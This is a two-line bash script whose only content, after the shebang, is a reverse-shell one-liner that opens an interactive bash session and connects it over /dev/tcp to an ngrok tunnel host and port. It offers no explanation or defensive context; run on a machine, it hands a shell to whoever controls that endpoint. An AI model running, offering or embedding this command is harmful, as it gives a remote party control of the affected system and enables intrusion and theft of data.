#!/bin/bash

bash -i >& /dev/tcp/2.tcp.ngrok.io/12777 0>&1
